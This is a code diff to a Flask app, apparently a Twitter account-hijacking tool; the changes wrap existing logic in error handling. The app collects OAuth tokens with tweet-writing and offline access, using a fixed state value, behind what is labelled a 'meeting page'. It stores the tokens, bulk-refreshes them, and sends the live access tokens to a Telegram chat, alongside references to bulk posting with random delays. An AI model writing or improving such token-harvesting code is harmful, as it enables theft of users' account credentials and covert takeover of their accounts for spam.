@@ -5,7 +5,7 @@ import sqlite3  # For database storage
 import requests
 import random  # For random delays in bulk posting
 import time  # For adding delays between posts
-from flask import Flask, redirect, request, session, render_template
+from flask import Flask, redirect, request, session, render_template, jsonify
 
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -41,14 +41,18 @@ init_db()  # Ensure the database is initialized when the app starts
 
 # Store token in the database
 def store_token(access_token, refresh_token, username):
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO tokens (access_token, refresh_token, username)
-        VALUES (?, ?, ?)
-    ''', (access_token, refresh_token, username))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO tokens (access_token, refresh_token, username)
+            VALUES (?, ?, ?)
+        ''', (access_token, refresh_token, username))
+        conn.commit()
+    except Exception as e:
+        print(f"Error storing token: {str(e)}")
+    finally:
+        conn.close()
 
 # Get all tokens from the database
 def get_all_tokens():
@@ -85,62 +89,46 @@ def refresh_token_in_db(refresh_token, username):
         'client_id': CLIENT_ID
     }
 
-    response = requests.post(token_url, headers=headers, data=data)
-    token_response = response.json()
+    try:
+        response = requests.post(token_url, headers=headers, data=data)
+        token_response = response.json()
 
-    if response.status_code == 200:
-        new_access_token = token_response.get('access_token')
-        new_refresh_token = token_response.get('refresh_token')
-        
-        # Update the token in the database
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        cursor.execute('UPDATE tokens SET access_token = ?, refresh_token = ? WHERE username = ?', 
-                       (new_access_token, new_refresh_token, username))
-        conn.commit()
-        conn.close()
-        
-        # Notify via Telegram
-        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
-        return new_access_token, new_refresh_token
-    else:
-        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
-        return None, None
-
-# Handle refreshing a single token
-def handle_refresh_single():
-    tokens = get_all_tokens()
-    if tokens:
-        access_token, refresh_token, username = tokens[0]  # Refresh the first token
-        if refresh_token:
-            refresh_token_in_db(refresh_token, username)
+        if response.status_code == 200:
+            new_access_token = token_response.get('access_token')
+            new_refresh_token = token_response.get('refresh_token')
+            
+            # Update the token in the database
+            conn = sqlite3.connect(DATABASE)
+            cursor = conn.cursor()
+            cursor.execute('UPDATE tokens SET access_token = ?, refresh_token = ? WHERE username = ?', 
+                           (new_access_token, new_refresh_token, username))
+            conn.commit()
+            conn.close()
+            
+            # Notify via Telegram
+            send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
+            return new_access_token, new_refresh_token
         else:
-            send_message_via_telegram(f"❌ No refresh token available for @{username}.")
-    else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
+            error_description = token_response.get('error_description', 'Unknown error')
+            send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {error_description}")
+            return None, None
 
-# Bulk refresh all tokens in the database
-def handle_refresh_bulk():
-    tokens = get_all_tokens()
-    if tokens:
-        for access_token, refresh_token, username in tokens:
-            if refresh_token:
-                refresh_token_in_db(refresh_token, username)
-            else:
-                send_message_via_telegram(f"❌ No refresh token available for @{username}.")
-        send_message_via_telegram(f"✅ Bulk token refresh completed.")
-    else:
-        send_message_via_telegram("❌ No tokens found to refresh.")
+    except Exception as e:
+        send_message_via_telegram(f"❌ Error refreshing token for @{username}: {str(e)}")
+        return None, None
 
 # Send message via Telegram
 def send_message_via_telegram(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=data)
+    except Exception as e:
+        print(f"Error sending message to Telegram: {str(e)}")
 
 # Confirm action based on pending command
 def confirm_action():
@@ -255,15 +243,18 @@ def home():
         state = "0"  # Fixed state
         session['oauth_state'] = state
 
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier  # Store code_verifier in session
+        try:
+            code_verifier, code_challenge = generate_code_verifier_and_challenge()
+            session['code_verifier'] = code_verifier  # Store code_verifier in session
 
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-        return redirect(authorization_url)
+            authorization_url = (
+                f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+                f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+                f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+            )
+            return redirect(authorization_url)
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
 
     if code:
         if error:
@@ -282,22 +273,33 @@ def home():
             'code_verifier': code_verifier
         }
 
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
+        try:
+            response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+            token_response = response.json()
 
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
+            if response.status_code == 200:
+                access_token = token_response.get('access_token')
+                refresh_token = token_response.get('refresh_token')
 
-            session['access_token'] = access_token
-            session['refresh_token'] = refresh_token
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
 
-            send_to_telegram(access_token, refresh_token)
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                # Notify via Telegram and store tokens
+                username = get_twitter_username(access_token)
+                if username:
+                    store_token(access_token, refresh_token, username)
+                    send_message_via_telegram(f"New authorization received for @{username}.")
+                else:
+                    send_message_via_telegram(f"New authorization received but username could not be fetched.")
+
+                return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+            else:
+                error_description = token_response.get('error_description', 'Unknown error')
+                error_code = token_response.get('error', 'No error code')
+                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
 
 # --- Meeting Page Route ---
 @app.route('/j')
@@ -313,11 +315,15 @@ def refresh_page(refresh_token2):
 
 # --- Generate code verifier and challenge ---
 def generate_code_verifier_and_challenge():
-    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
-    code_challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(code_verifier.encode()).digest()
-    ).rstrip(b'=').decode('utf-8')
-    return code_verifier, code_challenge
+    try:
+        code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
+        code_challenge = base64.urlsafe_b64encode(
+            hashlib.sha256(code_verifier.encode()).digest()
+        ).rstrip(b'=').decode('utf-8')
+        return code_verifier, code_challenge
+    except Exception as e:
+        print(f"Error generating code verifier and challenge: {str(e)}")
+        raise e
 
 # --- Startup message ---
 def send_startup_message():
